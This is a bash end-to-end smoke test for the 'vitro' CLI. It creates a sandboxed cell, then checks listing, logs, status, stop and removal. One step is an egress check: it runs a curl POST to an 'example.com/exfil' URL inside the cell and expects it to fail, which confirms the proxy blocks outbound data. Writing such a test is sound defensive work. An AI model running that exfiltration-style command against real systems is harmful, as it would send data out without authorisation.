#!/usr/bin/env bash
# End-to-end smoke test. Drives the real CLI against a real server.
# Not part of the inner loop — run before release / after deploy changes.
#
# Prereqs:
#   - vitro on PATH (or built via `cargo build --release`)
#   - a configured server (vitro server add ...) with the host module
#   - $TEST_SERVER set (defaults to "test")
#
# Usage:
#   ./nix/tests/e2e.sh
#
# Exit codes: 0 ok, non-zero on the first failed step.

set -euo pipefail

SERVER="${TEST_SERVER:-test}"
CELL="vitro-e2e-$$"
LOG_GREP="vitro-e2e-marker-$RANDOM"

cleanup() {
  local rc=$?
  echo "--- cleanup: removing $CELL"
  vitro remove -d "$CELL" 2>/dev/null || true
  exit "$rc"
}
trap cleanup EXIT

step() { echo; echo "=== $*"; }

step "1. version + server reachable"
vitro --version
vitro server list --json | grep -q "\"$SERVER\"" || {
  echo "server '$SERVER' not registered. Add it with: vitro server add $SERVER <ssh-target>"
  exit 1
}

step "2. create cell (branch + worktree + VM)"
vitro create "$CELL" --server "$SERVER" --no-switch

step "3. cell shows in list"
vitro list --json | grep -q "\"$CELL\"" \
  || { echo "FAIL: cell missing from list"; exit 1; }

step "4. ad-hoc run produces output"
vitro run "$CELL" -c "echo $LOG_GREP"

step "5. logs contain marker"
vitro logs "$CELL" | grep -q "$LOG_GREP" \
  || { echo "FAIL: marker '$LOG_GREP' not in logs"; exit 1; }

step "6. status returns running JSON"
vitro status "$CELL" --json | grep -q "\"name\":\"$CELL\"" \
  || { echo "FAIL: status JSON shape wrong"; exit 1; }

step "7. egress block — POST to non-allowlisted host fails inside cell"
# This MUST fail. We invert the exit code: success means proxy let it through (bug).
if vitro shell "$CELL" -c "curl -fsS -X POST https://example.com/exfil"; then
  echo "FAIL: cell was able to POST to a non-allowlisted host — proxy is broken"
  exit 1
fi

step "8. stop preserves data"
vitro stop "$CELL"
vitro list --json | grep -q "\"name\":\"$CELL\"" \
  || { echo "FAIL: stopped cell disappeared from list"; exit 1; }

step "9. remove -d wipes everything"
vitro remove -d "$CELL"
vitro list --json | grep -q "\"name\":\"$CELL\"" \
  && { echo "FAIL: cell still listed after remove -d"; exit 1; }

trap - EXIT
echo
echo "E2E PASS"
